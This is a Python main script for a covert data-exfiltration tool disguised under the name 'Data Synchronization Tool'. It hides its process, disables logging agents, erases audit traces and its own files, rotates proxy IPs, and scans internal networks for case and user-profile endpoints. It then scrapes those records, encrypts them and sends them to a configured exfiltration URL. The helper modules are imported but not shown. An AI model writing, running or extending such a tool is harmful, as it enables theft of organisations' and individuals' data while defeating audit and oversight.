# main.py
import argparse
import concurrent.futures
import os
import sys
import json
import time
import signal
import atexit
from cryptography.fernet import Fernet

# Import modules
from modules.auth import get_auth_token, TokenManager
from modules.scraper import extract_cases, Scraper
from modules.exporter import save_to_csv, save_to_json, exfiltrate_data
from modules.fingerprinting import get_host_fingerprint, get_system_info
from modules.stealth import disable_logging_agents, remove_audit_traces, clean_environment, hide_process
from modules.lateral import scan_for_internal_endpoints, scan_network
from modules.ip_rotation import get_proxy, ProxyManager
from modules.encryption import encrypt_data, decrypt_data, generate_key
from modules.timestamps import current_ts, current_unix_ts
from modules.logger import get_logger, cleanup_all_traces, silent_log

# Global tracking of created files for cleanup
created_files = []

def cleanup_handler():
    """Handle cleanup on exit"""
    logger = get_logger()
    logger.debug("Running exit cleanup handler")
    
    # Remove created files
    for file_path in created_files:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except:
            pass
    
    # Clean logs and other traces
    cleanup_all_traces()
    remove_audit_traces()

def signal_handler(sig, frame):
    """Handle termination signals"""
    logger = get_logger()
    logger.debug(f"Received signal {sig}, cleaning up")
    cleanup_handler()
    sys.exit(0)

def parse_args():
    """Parse command line arguments with stealth defaults"""
    parser = argparse.ArgumentParser(description="Data Synchronization Tool")
    
    # Basic configuration - using innocent names
    parser.add_argument("--config", default="config/auth.json", help="Config path")
    parser.add_argument("--output", default="output/data_sync.csv", help="Output path")
    parser.add_argument("--format", choices=["csv", "json", "both"], default="csv", help="Output format")
    
    # Stealth options - enabled by default
    parser.add_argument("--stealth", action="store_true", default=True, help="Enable stealth mode")
    parser.add_argument("--no-stealth", action="store_false", dest="stealth", help="Disable stealth mode")
    parser.add_argument("--cleanup", action="store_true", default=True, help="Clean traces on exit")
    parser.add_argument("--no-cleanup", action="store_false", dest="cleanup", help="Keep traces on exit")
    
    # Logging options - silent by default
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--log-file", help="Log to file (dangerous in stealth mode)")
    
    # Performance options
    parser.add_argument("--threads", type=int, default=2, help="Concurrent threads")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    
    # Security options
    parser.add_argument("--encrypt", action="store_true", default=True, help="Encrypt output")
    parser.add_argument("--no-encrypt", action="store_false", dest="encrypt", help="Disable encryption")
    parser.add_argument("--key-file", help="Key file location")
    parser.add_argument("--rotate-ip", action="store_true", default=True, help="Use IP rotation")
    parser.add_argument("--no-rotate-ip", action="store_false", dest="rotate_ip", help="Disable IP rotation")
    
    # Network options
    parser.add_argument("--scan", action="store_true", default=True, help="Scan for endpoints")
    parser.add_argument("--no-scan", action="store_false", dest="scan", help="Use predefined endpoints")
    
    # Exfiltration options
    parser.add_argument("--no-exfil", action="store_true", help="Disable exfiltration")
    
    return parser.parse_args()

def main():
    """Main stealth execution function"""
    # Set up signal handlers for cleanup
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    atexit.register(cleanup_handler)
    
    # Parse arguments
    args = parse_args()
    
    # Configure logger for stealth by default
    logger = get_logger(silent=not args.verbose, self_destruct=args.cleanup)
    logger.debug("Initializing operation")
    
    # Apply process hiding if in stealth mode
    if args.stealth:
        hide_process()
        logger.debug("Process hiding applied")
    
    # Track start time for operation length monitoring
    start_time = time.time()
    
    try:
        # Initialize stealth mode
        if args.stealth:
            disable_logging_agents()
            clean_environment()
            logger.debug("Stealth mode active")
        
        # Load configuration
        try:
            with open(args.config) as f:
                cfg = json.load(f)
            logger.debug("Configuration loaded")
        except Exception as e:
            logger.error(f"Configuration error: {str(e)}")
            return 1
        
        # Get host fingerprint - minimal info in stealth mode
        host_info = get_host_fingerprint()
        logger.debug(f"Host: {host_info['hostname']}")
        
        # IP rotation
        if args.rotate_ip:
            proxy_manager = ProxyManager(args.config)
            proxy = proxy_manager.get_proxy(test=False)  # No testing in stealth mode
            if proxy:
                logger.debug(f"Using proxy: {proxy}")
                proxy_manager.apply_proxy_to_environment()
        
        # Get authentication token
        token_manager = TokenManager(args.config)
        token = token_manager.get_token()
        logger.debug("Authentication successful")
        
        # Scan for endpoints or use predefined ones
        if args.scan:
            internal_services = scan_for_internal_endpoints()
            logger.debug(f"Found {len(internal_services)} endpoints")
        else:
            internal_services = [
                "https://nxgen.internal/api/cases",
                "https://nxgen.internal/api/user_profiles"
            ]
            logger.debug("Using predefined endpoints")
        
        # Initialize scraper with stealth settings
        scraper = Scraper(
            token, 
            cfg.get("api_base"),
            stealth_mode=args.stealth,
            min_delay=1.0,  # Longer delays for stealth
            max_delay=3.0
        )
        
        # Extract data with concurrent workers
        logger.debug("Beginning extraction")
        all_cases = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            future_to_endpoint = {}
            for endpoint in internal_services:
                if "cases" in endpoint:
                    future = executor.submit(scraper.extract_pagination, endpoint)
                    future_to_endpoint[future] = endpoint
            
            for future in concurrent.futures.as_completed(future_to_endpoint):
                endpoint = future_to_endpoint[future]
                try:
                    data = future.result()
                    all_cases.extend(data)
                    logger.debug(f"Extracted {len(data)} records from {endpoint}")
                except Exception as e:
                    logger.debug(f"Error with {endpoint}: {str(e)}")
        
        logger.debug(f"Total records: {len(all_cases)}")
        
        # Handle encryption
        key = None
        if args.encrypt:
            if args.key_file and os.path.exists(args.key_file):
                with open(args.key_file, "rb") as f:
                    key = f.read()
            else:
                key = generate_key()
                # Only save key if explicitly requested
                if args.key_file:
                    key_dir = os.path.dirname(args.key_file)
                    if key_dir:
                        os.makedirs(key_dir, exist_ok=True)
                    with open(args.key_file, "wb") as f:
                        f.write(key)
                    # Track for cleanup
                    if args.cleanup:
                        created_files.append(args.key_file)
        
        # Save extracted data
        if all_cases:
            # Output directory
            output_dir = os.path.dirname(args.output)
            if output_dir:
                os.makedirs(output_dir, exist_ok=True)
            
            # Track files for cleanup
            if args.cleanup:
                created_files.append(args.output)
                created_files.append(args.output.replace(".csv", ".json"))
                created_files.append(args.output + ".enc")
                created_files.append(args.output.replace(".csv", ".json") + ".enc")
            
            # Save in requested format(s)
            if args.format in ["csv", "both"]:
                output_path = args.output
                if args.encrypt:
                    json_data = json.dumps(all_cases)
                    encrypted_data = encrypt_data(json_data, key)
                    with open(output_path + ".enc", "wb") as f:
                        f.write(encrypted_data)
                    logger.debug(f"Encrypted data saved ({len(encrypted_data)} bytes)")
                else:
                    save_to_csv(all_cases, output_path)
                    logger.debug(f"CSV data saved")
            
            if args.format in ["json", "both"]:
                output_path = args.output.replace(".csv", ".json")
                if args.encrypt:
                    json_data = json.dumps(all_cases)
                    encrypted_data = encrypt_data(json_data, key)
                    with open(output_path + ".enc", "wb") as f:
                        f.write(encrypted_data)
                else:
                    save_to_json(all_cases, output_path)
                    logger.debug("JSON data saved")
        
        # Exfiltrate data if not disabled
        if not args.no_exfil and "exfil_url" in cfg and all_cases:
            success = exfiltrate_data(all_cases, cfg["exfil_url"])
            logger.debug(f"Exfiltration {'successful' if success else 'failed'}")
        
        # Calculate execution time
        execution_time = time.time() - start_time
        logger.debug(f"Operation completed in {execution_time:.2f}s")
        
        # Final cleanup for stealth operation
        if args.stealth and args.cleanup:
            remove_audit_traces()
            logger.debug("Audit traces removed")
        
        return 0
    
    except Exception as e:
        logger.error(f"Operation error: {str(e)}")
        if args.verbose:
            import traceback
            logger.debug(traceback.format_exc())
        return 1

if __name__ == "__main__":
    sys.exit(main())